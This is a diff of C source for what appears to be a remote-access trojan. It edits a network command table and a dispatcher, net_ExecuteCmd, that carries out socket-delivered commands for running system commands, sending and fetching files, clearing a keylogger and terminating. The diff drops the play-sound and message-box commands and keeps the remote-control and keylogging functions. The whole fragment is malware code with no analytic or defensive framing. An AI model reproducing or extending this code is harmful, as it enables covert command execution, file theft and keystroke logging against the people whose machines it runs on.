@@ -8,7 +8,7 @@
 #include "server.h"
 #include "types.h"
 
-char* net_cmdList[NET_CMD_TOTAL] = { "", "echo ", "identify", "system ", "send_file ", "get_file ", "msci_sound ", "keylog_clear", "mbox ", "terminate"};
+char* net_cmdList[NET_CMD_TOTAL] = { "", "echo ", "identify", "system ", "send_file ", "get_file ", 0, "keylog_clear", 0, "terminate"};
 int net_cmdLenList[NET_CMD_TOTAL] = { 0, 5, 9, 7, 10, 9, 11, 12, 5, 9 };
 int net_cmdArgsList[NET_CMD_TOTAL] = { 0, 1, 0, 1, 1, 1, 1, 0, 1, 0 };
 
@@ -126,12 +126,8 @@ int net_ExecuteCmd(char* msg, int msgLen, SOCKET sock)
 		net_reciveTries = NET_RECV_TRIES;
 		
 		return rv;
-	}else if(net_equalsCmd(msg, NET_CMD_PLAYSOUND, msgLen)){
-		return net_cmd_PlaySound(msg, msgLen, sock);
 	}else if(net_equalsCmd(msg, NET_CMD_KEYLOGGER_CLEAR, msgLen)){
 		return net_cmd_kl_Clear(msg, msgLen, sock);
-	}else if(net_equalsCmd(msg, NET_CMD_MESSAGEBOX, msgLen)){
-		return net_cmd_Mbox(msg, msgLen, sock);
 	}else if(net_equalsCmd(msg, NET_CMD_TERMINATE, msgLen)){
 		return net_cmd_Terminate(msg, msgLen, sock);
 	}else{
